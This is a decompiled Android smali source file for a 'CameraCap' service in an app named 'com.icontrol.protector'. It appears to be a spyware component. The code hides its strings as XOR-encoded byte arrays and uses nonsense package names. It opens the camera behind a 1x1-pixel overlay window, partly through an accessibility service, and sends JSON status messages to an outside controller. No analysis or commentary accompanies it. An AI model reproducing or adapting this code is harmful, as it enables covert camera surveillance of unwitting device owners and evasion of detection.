.class public Lcom/icontrol/protector/CameraCap;
.super Landroid/app/Service;
.source "SourceFile"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static f:Landroid/hardware/Camera; = null

.field public static g:Landroid/view/SurfaceView; = null

.field public static h:Z = false

.field public static i:Z = false

.field private static j:Ljava/lang/Object;

.field public static k:Ljava/lang/String;

.field public static l:Landroid/view/WindowManager$LayoutParams;

.field public static m:Landroid/view/WindowManager;

.field public static n:Landroid/view/SurfaceView;

.field static o:Lcom/icontrol/protector/CameraCap;

.field public static p:Lntidisestablish/neumonoul/floccinaucinih/m70;


# instance fields
.field private b:Ljava/util/List;

.field private c:I

.field private d:Ljava/lang/String;

.field private e:Lntidisestablish/neumonoul/floccinaucinih/ks;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/icontrol/protector/CameraCap;->j:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/icontrol/protector/CameraCap;->b:Ljava/util/List;

    const/16 v0, 0x46

    iput v0, p0, Lcom/icontrol/protector/CameraCap;->c:I

    return-void
.end method

.method private b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7

    .line 1
    sget-object v0, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz v0, :cond_1

    const/4 v0, 0x2

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->y:Ljava/lang/String;

    const/4 v3, 0x4

    new-array v4, v3, [B

    fill-array-data v4, :array_4

    new-array v5, v1, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {p1, v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const/4 v4, 0x3

    new-array v5, v4, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/icontrol/protector/CameraCap;->d:Ljava/lang/String;

    invoke-virtual {v2, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v4, [B

    fill-array-data v5, :array_8

    new-array v6, v1, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v5, v1, [B

    fill-array-data v5, :array_b

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v5, 0xa

    new-array v5, v5, [B

    fill-array-data v5, :array_c

    new-array v6, v1, [B

    fill-array-data v6, :array_d

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v0, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v3, [B

    fill-array-data v0, :array_e

    new-array v3, v1, [B

    fill-array-data v3, :array_f

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v3, v4, [B

    fill-array-data v3, :array_10

    new-array v5, v1, [B

    fill-array-data v5, :array_11

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v4, [B

    fill-array-data v0, :array_12

    new-array v3, v1, [B

    fill-array-data v3, :array_13

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v4, [B

    fill-array-data p2, :array_14

    new-array v0, v1, [B

    fill-array-data v0, :array_15

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v2, p2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object p1, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x8t
        0x76t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x4ft
        0x32t
        0x4et
        -0x30t
        -0x51t
        -0x1at
        0x68t
        0x67t
    .end array-data

    :array_2
    .array-data 1
        -0x28t
        -0x19t
        -0x4et
        -0x62t
        -0x62t
        0x8t
        0x5bt
        0x71t
    .end array-data

    :array_3
    .array-data 1
        -0x64t
        -0x7et
        -0x3ct
        -0x9t
        -0x3t
        0x6dt
        0x32t
        0x15t
    .end array-data

    :array_4
    .array-data 1
        0x69t
        0x10t
        0x21t
        -0xbt
    .end array-data

    :array_5
    .array-data 1
        0x7t
        0x65t
        0x4dt
        -0x67t
        0x70t
        0x64t
        -0x4at
        0x19t
    .end array-data

    :array_6
    .array-data 1
        0x12t
        -0x6dt
        -0x2t
    .end array-data

    :array_7
    .array-data 1
        0x7bt
        -0x9t
        -0x68t
        0xdt
        0x71t
        0x64t
        -0x58t
        -0x12t
    .end array-data

    :array_8
    .array-data 1
        0x5dt
        0x24t
        -0x5dt
    .end array-data

    :array_9
    .array-data 1
        0x2dt
        0x4dt
        -0x39t
        0x7bt
        -0x38t
        0x45t
        0x1t
        -0x69t
    .end array-data

    :array_a
    .array-data 1
        -0x4bt
        -0xct
        -0x27t
        -0x60t
        -0x5at
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x24t
        -0x80t
        -0x60t
        -0x30t
        -0x3dt
        -0x42t
        0x11t
        0x3bt
    .end array-data

    :array_c
    .array-data 1
        -0xbt
        -0xat
        -0x44t
        0x7ft
        0x76t
        -0x77t
        -0x7t
        0xft
        -0x38t
        -0x12t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x5at
        -0x66t
        -0x32t
        0x20t
        0x15t
        -0x1bt
        -0x70t
        0x6at
    .end array-data

    :array_e
    .array-data 1
        -0x58t
        0xet
        0x4et
        -0x3ft
    .end array-data

    :array_f
    .array-data 1
        -0x25t
        0x7bt
        0x2ct
        -0x5et
        -0x24t
        0x5dt
        -0x33t
        0x6t
    .end array-data

    :array_10
    .array-data 1
        -0x2at
        -0x58t
        0x40t
    .end array-data

    :array_11
    .array-data 1
        -0x45t
        -0x25t
        0x27t
        -0x4ct
        0x5at
        -0x7ft
        0x32t
        0x56t
    .end array-data

    :array_12
    .array-data 1
        -0x3t
        0x22t
        -0x54t
    .end array-data

    :array_13
    .array-data 1
        -0x70t
        0x51t
        -0x35t
        0x4ct
        -0x22t
        0x69t
        -0x7ct
        0x73t
    .end array-data

    :array_14
    .array-data 1
        0x5bt
        0x63t
        0x4at
    .end array-data

    :array_15
    .array-data 1
        0x38t
        0xat
        0x3at
        0x66t
        -0x7ft
        -0x6bt
        0x3t
        0x52t
    .end array-data
.end method

.method public static c(Landroid/content/Context;)V
    .locals 2

    .line 1
    :try_start_0
    sget-object p0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    if-eqz p0, :cond_0

    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    sget-object p0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {p0}, Landroid/hardware/Camera;->release()V

    sput-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    :cond_0
    const/4 p0, 0x0

    sput-boolean p0, Lcom/icontrol/protector/CameraCap;->i:Z

    sget-boolean v0, Lcom/icontrol/protector/CameraCap;->h:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v0, :cond_1

    :try_start_1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    sget-object v0, Lcom/icontrol/protector/AccessServices;->v:Landroid/view/WindowManager;

    sget-object v1, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_1
    :try_start_2
    sput-boolean p0, Lcom/icontrol/protector/CameraCap;->h:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :try_start_3
    sget-object p0, Lcom/icontrol/protector/CameraCap;->o:Lcom/icontrol/protector/CameraCap;

    if-eqz p0, :cond_2

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    :cond_2
    return-void
.end method

.method static synthetic d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/CameraCap;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    return-object p0
.end method

.method static synthetic e(Lcom/icontrol/protector/CameraCap;Lntidisestablish/neumonoul/floccinaucinih/ks;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/CameraCap;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    return-object p1
.end method

.method static synthetic f()Ljava/lang/Object;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/CameraCap;->j:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/CameraCap;->b:Ljava/util/List;

    return-object p0
.end method

.method static synthetic h(Lcom/icontrol/protector/CameraCap;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/CameraCap;->c:I

    return p0
.end method

.method static synthetic i(Lcom/icontrol/protector/CameraCap;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/CameraCap;->b(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method public static k()Ljava/lang/String;
    .locals 9

    .line 1
    const-string v0, ""

    const/4 v1, 0x0

    :try_start_0
    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v2

    new-instance v3, Ljava/util/Vector;

    invoke-direct {v3}, Ljava/util/Vector;-><init>()V

    move v3, v1

    :goto_0
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v4

    if-ge v3, v4, :cond_0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v5, 0x1

    new-array v6, v5, [B

    const/16 v7, -0xe

    aput-byte v7, v6, v1

    const/16 v7, 0x8

    new-array v8, v7, [B

    fill-array-data v8, :array_0

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/hardware/Camera$Size;

    iget v6, v6, Landroid/hardware/Camera$Size;->width:I

    invoke-static {v6}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v5, v5, [B

    const/16 v6, -0x59

    aput-byte v6, v5, v1

    new-array v6, v7, [B

    fill-array-data v6, :array_1

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/Camera$Size;

    iget v5, v5, Landroid/hardware/Camera$Size;->height:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v5, 0x2

    new-array v5, v5, [B

    fill-array-data v5, :array_2

    new-array v6, v7, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :catch_0
    :cond_0
    return-object v0

    :array_0
    .array-data 1
        -0x57t
        0x22t
        -0xdt
        0xdt
        0xbt
        0x2at
        -0x46t
        0x26t
    .end array-data

    :array_1
    .array-data 1
        -0x21t
        0x65t
        0x41t
        -0x79t
        -0xat
        -0x22t
        0x4t
        0x18t
    .end array-data

    :array_2
    .array-data 1
        0x70t
        0x1bt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x2dt
        0x37t
        -0x67t
        0x2bt
        -0x66t
        -0x3dt
        -0x7et
        -0x3t
    .end array-data
.end method

.method private l(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_0

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    const/4 v1, 0x1

    invoke-static {p0, v0, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/w6;->a(Lcom/icontrol/protector/CameraCap;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_0
    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/CameraCap$a;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/CameraCap$a;-><init>(Lcom/icontrol/protector/CameraCap;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public j()Z
    .locals 1

    .line 1
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sput-object p0, Lcom/icontrol/protector/CameraCap;->o:Lcom/icontrol/protector/CameraCap;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/CameraCap;->l(Landroid/content/Context;)V

    return-void
.end method

.method public onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/CameraCap;->o:Lcom/icontrol/protector/CameraCap;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->c(Landroid/content/Context;)V

    sget-object v0, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz v0, :cond_0

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x3e8

    invoke-interface {v0, v2, v1}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    :cond_0
    return-void

    :array_0
    .array-data 1
        -0x1at
        0x5dt
        -0x45t
        0x2at
        -0x25t
        -0x60t
        0x73t
    .end array-data

    :array_1
    .array-data 1
        -0x5bt
        0x31t
        -0x2ct
        0x59t
        -0x4et
        -0x32t
        0x14t
        -0x2ct
    .end array-data
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 22

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    :try_start_0
    sput-object v0, Lcom/icontrol/protector/CameraCap;->o:Lcom/icontrol/protector/CameraCap;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v0, v3}, Lcom/icontrol/protector/CameraCap;->l(Landroid/content/Context;)V

    const/4 v4, 0x5

    new-array v4, v4, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    if-eqz v1, :cond_4

    invoke-virtual {v1, v4}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_4

    sget-object v6, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->v:Landroid/view/WindowManager;

    const/16 v7, 0x1c

    const/16 v8, 0x11

    const/16 v9, 0x33

    if-eqz v6, :cond_1

    sget-object v6, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    if-eqz v6, :cond_1

    invoke-virtual {v1, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/icontrol/protector/CameraCap;->k:Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/CameraCap;->j()Z

    move-result v1

    sput-boolean v1, Lcom/icontrol/protector/CameraCap;->h:Z

    if-nez v1, :cond_0

    new-instance v1, Landroid/view/SurfaceView;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-direct {v1, v4}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    sget-object v1, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    iput v9, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v1, Lcom/icontrol/protector/AccessServices;->v:Landroid/view/WindowManager;

    sget-object v4, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v4, v5}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v1, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    :goto_0
    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    invoke-virtual {v0, v3}, Lcom/icontrol/protector/CameraCap;->a(Landroid/content/Context;)V

    goto/16 :goto_3

    :cond_0
    new-array v1, v8, [B

    fill-array-data v1, :array_2

    new-array v4, v5, [B

    fill-array-data v4, :array_3

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v4, v7, [B

    fill-array-data v4, :array_4

    new-array v5, v5, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v1, v4}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v3}, Lcom/icontrol/protector/CameraCap;->c(Landroid/content/Context;)V

    return v2

    :cond_1
    invoke-virtual {v1, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/icontrol/protector/CameraCap;->k:Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/icontrol/protector/CameraCap;->j()Z

    move-result v1

    sput-boolean v1, Lcom/icontrol/protector/CameraCap;->h:Z

    if-nez v1, :cond_3

    const/4 v1, 0x6

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v4, v5, [B

    fill-array-data v4, :array_7

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lcom/icontrol/protector/CameraCap;->m:Landroid/view/WindowManager;

    new-instance v1, Landroid/view/SurfaceView;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-direct {v1, v4}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/icontrol/protector/CameraCap;->n:Landroid/view/SurfaceView;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v1, v4, :cond_2

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v11, 0x1

    const/4 v12, 0x1

    const/16 v13, 0x7f6

    const/16 v14, 0x38

    const/4 v15, -0x3

    move-object v10, v1

    invoke-direct/range {v10 .. v15}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    :goto_1
    sput-object v1, Lcom/icontrol/protector/CameraCap;->l:Landroid/view/WindowManager$LayoutParams;

    goto :goto_2

    :cond_2
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/16 v17, 0x1

    const/16 v18, 0x1

    const/16 v19, 0x7d6

    const/high16 v20, 0x40000

    const/16 v21, -0x3

    move-object/from16 v16, v1

    invoke-direct/range {v16 .. v21}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    goto :goto_1

    :goto_2
    sget-object v1, Lcom/icontrol/protector/CameraCap;->l:Landroid/view/WindowManager$LayoutParams;

    iput v9, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v4, Lcom/icontrol/protector/CameraCap;->m:Landroid/view/WindowManager;

    sget-object v5, Lcom/icontrol/protector/CameraCap;->n:Landroid/view/SurfaceView;

    invoke-interface {v4, v5, v1}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v1, Lcom/icontrol/protector/CameraCap;->n:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    goto/16 :goto_0

    :cond_3
    new-array v1, v8, [B

    fill-array-data v1, :array_8

    new-array v4, v5, [B

    fill-array-data v4, :array_9

    invoke-static {v1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v4, v7, [B

    fill-array-data v4, :array_a

    new-array v5, v5, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v1, v4}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v3}, Lcom/icontrol/protector/CameraCap;->c(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v2

    :cond_4
    :goto_3
    const/4 v1, 0x1

    return v1

    :catch_0
    return v2

    nop

    :array_0
    .array-data 1
        -0x66t
        -0x50t
        -0x25t
        0x1t
        0x72t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x27t
        -0xct
        -0x46t
        0x75t
        0x13t
        0x3ct
        0x4ct
        0x6ft
    .end array-data

    :array_2
    .array-data 1
        0x79t
        -0x6et
        -0x7bt
        0x6ct
        -0x6at
        0x26t
        0x4ct
        -0x77t
        0x4et
        -0x6et
        -0x66t
        0x7dt
        -0x3ct
        0x21t
        0xdt
        -0x6dt
        0x56t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x3at
        -0xdt
        -0x18t
        0x9t
        -0x1ct
        0x47t
        0x6ct
        -0x6t
    .end array-data

    :array_4
    .array-data 1
        -0x40t
        0x72t
        0x58t
        0x13t
        0x71t
        0x2ft
        0x52t
        -0x66t
        -0x13t
        0x33t
        0x40t
        0x5t
        0x66t
        0x6et
        0x30t
        -0x76t
        -0x5dt
        0x72t
        0x5bt
        0x19t
        0x77t
        0x26t
        0x17t
        -0x7ft
        -0x5dt
        0x52t
        0x45t
        0x6t
    .end array-data

